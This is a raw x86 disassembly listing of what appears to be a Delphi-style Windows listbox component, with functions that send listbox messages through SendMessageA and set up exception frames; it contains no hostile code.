call sub_40349c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40349c
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434a0d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434a86
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43ddf8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4551d4
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_443a7c
mov eax ebx
mov si 0xffb8
call sub_40349c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40349c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434a8d
sub_434a94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_443a84
pop edi
pop esi
pop ebx
retn
sub_434ae8
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42c584
call sub_42c664
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_434b14
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42c584
mov ebx eax
mov eax ebx
call sub_42c664
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4445f8
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42c7fc
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434b60
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_434630
mov edx 0x71
mov eax esi
call sub_43d5b4
mov edx 0x11
mov eax esi
call sub_43d5d8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_434bc8
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_434c08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_441328
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4412ec
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44a6b8
sub_434cc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44482c
mov eax [ ebp - 0x4 ]
call sub_4448fc
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
push ebp
call sub_434c08
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43da04
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_40349c
sub_434d50
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4347ec
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_4413b0
mov eax ebx
mov si 0xffc8
call sub_40349c
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_434da7
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x3801173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
sub_434ddc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434e51
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43ddf8
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4551d4
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_443a7c
mov eax ebx
mov si 0xffb8
call sub_40349c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434e58
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_434e60
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_40349c
jmp r-xdata
pop esi
retn
sub_434eac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434f70
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_4445f8
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_436b60
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4046c0
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_414e08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434f77
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_404534
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4046c0
sub_434f80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_435003
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_40349c
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_436b80
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43500a
lea eax [ ebp - 0x8 ]
call sub_404074
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_414e08
sub_435014
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_40349c
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_40349c
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_40349c
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_435094
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_40349c
sub_4350bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_435149
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435150
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
push 0x0
push 0x180
mov eax edi
call sub_4445f8
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_43515c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4351e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4351ec
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
push edi
push 0x181
mov eax esi
call sub_4445f8
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_435204
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_435354
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43535b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
retn
mov eax [ ebp - 0x4 ]
call sub_414c8c
xor eax eax
push ebp
push sub_435332
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_40349c
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_40349c
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_40349c
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_40349c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414d48
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_435374
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_43e334
sub_4353a8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_404534
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_4445f8
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_436ba8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4353ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4354eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4354f2
lea eax [ ebp - 0xc ]
call sub_404074
retn
mov eax [ ebp - 0x4 ]
call sub_414c8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_4354ce
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_414d48
retn
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_40349c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
xor ecx ecx
mov edx ebx
mov si 0xffb2
call sub_40349c
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_40349c
sub_4354fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_440324
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax ebx
call sub_43d5b4
mov edx 0x61
mov eax ebx
call sub_43d5d8
mov dl 0x1
mov eax ebx
call sub_44482c
xor edx edx
mov eax ebx
call sub_43dfbc
mov [ ebx + 0x210 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov [ ebx + 0x218 ] esi
mov [ esi + 0x10 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd3c
mov esi eax
mov [ ebx + 0x228 ] esi
mov eax esi
mov edx ebx
call sub_43c9d4
mov [ ebx + 0x230 ] 0x10
mov [ ebx + 0x224 ] 0x1
mov [ ebx + 0x23b ] 0x1
mov [ ebx + 0x234 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_4355e8
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440448
mov eax [ esi + 0x228 ]
call sub_4032a0
mov eax [ esi + 0x218 ]
call sub_4032a0
mov eax [ esi + 0x240 ]
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_435630
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_4356a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404534
mov esi eax
mov eax esi
call sub_4086f4
push eax
mov edx esi
lea eax [ ebp - 0x8 ]
pop ecx
call sub_404164
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x218 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4356aa
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
sub_4356b4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x199
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4356d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x19a
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_435710
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x182
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_435730
push ebx
mov ebx eax
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
pop ebx
retn
push 0x0
push 0x0
push 0x184
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
sub_435764
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
or edx 0xffffffff
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
xor ecx ecx
mov edx edi
mov eax esi
call sub_435ba4
inc edi
dec ebx
jne r-xdata
jmp r-xdata
sub_4357ac
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4358c3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x208 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4358ca
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_404098
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404534
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_40426c
mov eax [ ebp - 0x14 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebx + 0x218 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_404534
mov edx eax
lea eax [ ebp - 0xc ]
call sub_40426c
mov eax [ ebp - 0xc ]
push eax
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0xd4 ]
mov edx esi
mov eax ebx
call sub_435b54
test al al
je r-xdata
jmp r-xdata
sub_4358d4
push ebx
push esi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx ebx
mov eax esi
call sub_435b54
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
pop esi
pop ebx
retn
sub_435940
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
jle r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
jle r-xdata
mov eax ebx
call sub_43d7fc
mov [ esp ] eax
fild [ esp ]
fild [ ebx + 0x22c ]
fdivp st1
call sub_402a84
mov esi eax
cmp esi 0x1
jge r-xdata
push 0x0
push esi
push 0x195
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
mov esi 0x1
sub_435994
push ebx
mov ebx eax
cmp edx [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_441b98
jmp r-xdata
test edx edx
jne r-xdata
mov [ ebx + 0x22c ] edx
mov eax ebx
call sub_4448fc
test al al
je r-xdata
mov eax ebx
call sub_435940
sub_4359d8
push ebx
mov ebx eax
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x188
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
push 0x0
push 0x0
push 0x19f
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
sub_435a54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x208 ] 0x0
je r-xdata
push 0x0
push esi
push 0x186
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
push 0x0
push esi
push 0x19e
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
jmp r-xdata
sub_435aa0
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x239 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x239 ] dl
mov eax ebx
call sub_441b98
mov eax ebx
mov si 0xffd0
call sub_40349c
sub_435ac8
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x230 ]
mov eax ebx
call sub_4448fc
test al al
je r-xdata
mov eax esi
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov edx 0x198
mov eax ebx
call sub_43efc4
mov esi [ esp + 0xc ]
sub esi [ esp + 0x4 ]
sub_435b54
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
sub_435ba4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_4445f8
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_4445f8
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_4445f8
push eax
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
jmp r-xdata
sub_435c78
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_441b98
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_435c54
sub_435cd0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_435d78
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435d7f
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax ebx
mov edx [ eax ]
